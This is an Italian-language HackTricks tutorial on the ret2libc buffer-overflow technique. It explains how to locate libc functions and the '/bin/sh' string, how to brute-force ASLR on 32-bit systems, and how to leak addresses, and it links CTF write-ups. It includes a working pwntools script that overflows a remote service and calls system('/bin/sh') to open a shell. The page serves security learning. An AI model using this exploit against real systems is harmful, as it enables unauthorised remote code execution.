# Ret2lib

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Informazioni di base**

L'essenza di **Ret2Libc** √® reindirizzare il flusso di esecuzione di un programma vulnerabile a una funzione all'interno di una libreria condivisa (ad es., **system**, **execve**, **strcpy**) invece di eseguire shellcode fornito dall'attaccante nello stack. L'attaccante crea un payload che modifica l'indirizzo di ritorno nello stack per puntare alla funzione della libreria desiderata, mentre organizza anche eventuali argomenti necessari per essere impostati correttamente secondo la convenzione di chiamata.

### **Passaggi di esempio (semplificati)**

* Ottenere l'indirizzo della funzione da chiamare (ad es. system) e il comando da chiamare (ad es. /bin/sh)
* Generare una catena ROP per passare il primo argomento che punta alla stringa del comando e il flusso di esecuzione alla funzione

## Trovare gli indirizzi

* Supponendo che la `libc` utilizzata sia quella della macchina corrente, puoi trovare dove verr√† caricata in memoria con:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Se vuoi controllare se l'ASLR sta cambiando l'indirizzo di libc, puoi fare:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Conoscendo la libc utilizzata, √® anche possibile trovare l'offset della funzione `system` con:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Conoscendo la libc utilizzata, √® anche possibile trovare l'offset alla stringa `/bin/sh` funzione con:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Utilizzando gdb-peda / GEF

Conoscendo la libc utilizzata, √® anche possibile usare Peda o GEF per ottenere l'indirizzo della funzione **system**, della funzione **exit** e della stringa **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Utilizzando /proc/\<PID>/maps

Se il processo sta creando **figli** ogni volta che parli con esso (server di rete) prova a **leggere** quel file (probabilmente avrai bisogno di essere root).

Qui puoi trovare **esattamente dove √® caricata la libc** all'interno del processo e **dove verr√† caricata** per ogni figlio del processo.

![](<../../../.gitbook/assets/image (853).png>)

In questo caso √® caricata in **0xb75dc000** (Questo sar√† l'indirizzo base della libc)

## Libc sconosciuta

Potrebbe essere possibile che **non conosci la libc che il binario sta caricando** (perch√© potrebbe trovarsi su un server a cui non hai accesso). In quel caso potresti abusare della vulnerabilit√† per **leakare alcuni indirizzi e scoprire quale libreria libc** viene utilizzata:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

E puoi trovare un template di pwntools per questo in:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Conoscere la libc con 2 offset

Controlla la pagina [https://libc.blukat.me/](https://libc.blukat.me/) e usa un **paio di indirizzi** di funzioni all'interno della libc per scoprire la **versione utilizzata**.

## Bypassare ASLR in 32 bit

Questi attacchi di brute-forcing sono **utili solo per sistemi a 32 bit**.

* Se l'exploit √® locale, puoi provare a forzare l'indirizzo base della libc (utile per sistemi a 32 bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Se attacchi un server remoto, potresti provare a **forzare l'indirizzo della funzione `usleep` di `libc`**, passando come argomento 10 (ad esempio). Se a un certo punto il **server impiega 10 secondi in pi√π per rispondere**, hai trovato l'indirizzo di questa funzione.

## One Gadget

Esegui una shell semplicemente saltando a **un** specifico **indirizzo** in libc:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## Esempio di codice x86 Ret2lib

In questo esempio, il brute-force ASLR √® integrato nel codice e il binario vulnerabile si trova su un server remoto:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Esempio di Codice

Controlla l'esempio da:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## Esempio Ret2lib ARM64

Nel caso di ARM64, l'istruzione ret salta a dove punta il registro x30 e non a dove punta il registro dello stack. Quindi √® un po' pi√π complicato.

Inoltre, in ARM64 un'istruzione fa ci√≤ che l'istruzione fa (non √® possibile saltare nel mezzo delle istruzioni e trasformarle in nuove).

Controlla l'esempio da:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (o puts)

Questo consente di **leak informazioni dal processo** chiamando `printf`/`puts` con alcuni dati specifici posti come argomento. Ad esempio, mettere l'indirizzo di `puts` nel GOT in un'esecuzione di `puts` **leaker√† l'indirizzo di `puts` in memoria**.

## Ret2printf

Questo significa fondamentalmente abusare di un **Ret2lib per trasformarlo in una vulnerabilit√† di stringhe di formato `printf`** utilizzando il `ret2lib` per chiamare printf con i valori per sfruttarlo (sembra inutile ma √® possibile):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Altri Esempi e riferimenti

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, dato un leak all'indirizzo di una funzione in libc, utilizzando un gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR abilitato ma senza PIE, il primo passo √® riempire un overflow fino al byte 0x00 del canary per poi chiamare puts e leakarlo. Con il canary viene creato un gadget ROP per chiamare puts per leakare l'indirizzo di puts dal GOT e poi un gadget ROP per chiamare `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR abilitato, senza canary, overflow dello stack in main da una funzione figlia. Gadget ROP per chiamare puts per leakare l'indirizzo di puts dal GOT e poi chiamare un gadget.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bit, senza pie, senza canary, senza relro, nx. Usa la funzione write per leakare l'indirizzo di write (libc) e chiama un gadget.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Usa una stringa di formato per leakare il canary dallo stack e un buffer overflow per chiamare system (√® nel GOT) con l'indirizzo di `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, senza relro, senza canary, nx, pie. Abusa di un indicizzazione errata per leakare indirizzi di libc e heap dallo stack. Abusa del buffer overflow per fare un ret2lib chiamando `system('/bin/sh')` (l'indirizzo dell'heap √® necessario per bypassare un controllo).

{% hint style="success" %}
Impara e pratica Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}
